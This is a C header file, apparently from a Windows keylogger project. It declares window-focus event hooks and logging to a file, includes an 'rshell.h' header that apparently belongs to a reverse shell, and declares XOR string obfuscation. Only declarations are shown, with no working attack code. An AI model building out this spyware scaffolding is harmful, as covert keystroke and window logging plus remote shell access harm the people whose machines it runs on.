#ifndef WINKEY_H
#define WINKEY_H

#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2  0x0A00
#define _WIN32_WINNT_WIN10_RS1  0x0A00
#define _WIN32_WINNT_WIN10_RS2  0x0A01
#define _WIN32_WINNT_WIN10_RS3  0x0A02
#define _WIN32_WINNT_WIN10_RS4  0x0A03
#define _WIN32_WINNT_WIN10_RS5  0x0A04

#define NTDDI_WIN11_DT 0x0A000007

#pragma warning(disable: 5045)
#pragma warning(disable: 4820)
#pragma warning(disable: 4548)

#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <stdlib.h>
#include <wchar.h>

#include "rshell.h"

extern HWND LOG_FD;

#define DBG(fmt, ...)                                      \
do {                                                       \
    char _buf[512];                                       \
    _snprintf_s(                                          \
        _buf,                                             \
        sizeof(_buf),                                     \
        _TRUNCATE,                                        \
        fmt,                                              \
        ##__VA_ARGS__);                                   \
    OutputDebugStringA(_buf);                              \
} while (0)


// unicode
#define DBG_unicode(fmt, ...)                                      \
    do {                                                           \
        wchar_t _wbuf[512];                                        \
        _snwprintf_s(                                              \
            _wbuf,                                                 \
            _countof(_wbuf),                                       \
            _TRUNCATE,                                             \
            L##fmt,                                                \
            ##__VA_ARGS__);                                        \
        OutputDebugStringW(_wbuf);                                  \
    } while (0)

// logs_utils.c
char    *GetMyLocalTime(void);
void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime);
void WriteToFile(char* str);
void _GetForegroundWindow(HWND hwnd);
void CreateLogFile(void);

// obfuscation.c
unsigned char *XorStrings(char *enc);

#endif